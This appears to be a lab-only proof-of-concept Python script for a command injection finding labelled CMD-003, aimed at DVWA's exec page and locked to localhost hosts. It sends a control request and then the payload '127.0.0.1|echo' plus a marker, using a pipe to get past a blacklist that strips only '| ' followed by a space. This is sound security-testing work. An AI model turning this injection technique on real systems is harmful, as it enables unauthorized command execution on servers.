#!/usr/bin/env python3
# Local-lab-only draft POC for CMD-003 (command injection).
# NOT EXECUTED. Requires a valid DVWA session supplied by the operator.
import argparse
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def load_cookie(path):
    if not path:
        return None
    try:
        with open(path, "r", encoding="utf-8") as fh:
            cookie = fh.read().strip()
    except OSError as exc:
        sys.exit("cannot read cookie file: %s" % exc)
    if not cookie or "\n" in cookie or "\r" in cookie:
        sys.exit("cookie file must contain one header value on one line")
    return cookie


def post(opener, url, form, cookie, timeout):
    data = urllib.parse.urlencode(form).encode("utf-8")
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("User-Agent", "cmd003-local-lab-poc/1.0")
    if cookie:
        req.add_header("Cookie", cookie)
    try:
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", "replace")
            return resp.status, body
    except urllib.error.HTTPError as exc:
        sys.exit("HTTP error %s (possible auth redirect or missing session); "
                 "verify login/security cookie" % exc.code)
    except urllib.error.URLError as exc:
        sys.exit("connection error: %s" % exc.reason)
    except TimeoutError:
        sys.exit("request timed out after %.1fs" % timeout)


def main():
    parser = argparse.ArgumentParser(description="CMD-003 local-only command injection draft")
    parser.add_argument("--base-url", required=True,
                        help="http(s)://localhost|127.0.0.1|::1[:port]")
    parser.add_argument("--path", default="/vulnerabilities/exec/",
                        help="absolute path of the vulnerable page")
    parser.add_argument("--cookie-file",
                        help="local file holding one Cookie header value (never commit)")
    parser.add_argument("--marker", default="CMDINJ_MARKER_7f3a")
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args()

    parts = urllib.parse.urlsplit(args.base_url)
    if parts.scheme not in ("http", "https") or (parts.hostname or "").lower() not in ALLOWED_HOSTS:
        sys.exit("refusing: --base-url must be http(s) on localhost, 127.0.0.1 or ::1")
    if not args.path.startswith("/") or "://" in args.path:
        sys.exit("refusing: --path must be an absolute path on the local target")
    url = args.base_url.rstrip("/") + args.path

    cookie = load_cookie(args.cookie_file)
    opener = urllib.request.build_opener(NoRedirect())

    # Control request: plain loopback IP, no shell metacharacters.
    status, body = post(opener, url, {"Submit": "Submit", "ip": "127.0.0.1"},
                        cookie, args.timeout)
    if args.marker in body:
        sys.exit("control response unexpectedly contains marker; abort")
    print("control: HTTP %s, %d bytes, marker absent" % (status, len(body)))

    # Test request: '|' is not filtered (blacklist only removes '| ' with a space).
    payload = "127.0.0.1|echo " + args.marker
    status, body = post(opener, url, {"Submit": "Submit", "ip": payload},
                        cookie, args.timeout)
    reflected_payload = payload in body
    marker_seen = args.marker in body
    print("test: HTTP %s, %d bytes, marker_seen=%s, raw_payload_reflected=%s"
          % (status, len(body), marker_seen, reflected_payload))
    if not marker_seen:
        sys.exit("no marker in response; injection not observed under these conditions")
    if reflected_payload:
        sys.exit("payload reflected verbatim; cannot distinguish reflection from execution")
    print("observed: marker present in command output block; manual re-check with a "
          "second unique marker and compare against the control response")


if __name__ == "__main__":
    main()
